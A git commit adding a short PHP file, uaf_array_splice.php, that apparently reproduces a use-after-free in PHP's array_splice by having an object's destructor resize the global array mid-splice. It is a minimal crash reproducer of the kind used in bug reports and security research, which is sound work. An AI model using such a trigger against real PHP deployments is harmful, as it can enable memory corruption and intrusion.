b3d6e3332a5c1efa7a2cbc97eb5c6bde56c4ea70
criskell <cris.moraes.ds@gmail.com>
2025-06-08 07:54:47 -0300

    php: array splice

---
+++ php/uaf_array_splice.php
@@ -0,0 +1,19 @@
+<?php
+function resize_arr() {
+    global $arr;
+    for ($i = 0; $i < 10; $i++) {
+        $arr[$i] = $i;
+    }
+}
+
+class C {
+    function __destruct() {
+        resize_arr();
+        return "3";
+    }
+}
+
+$arr = ["a" => "1", "3" => new C, "2" => "2"];
+
+array_splice($arr, 1, 2);
+
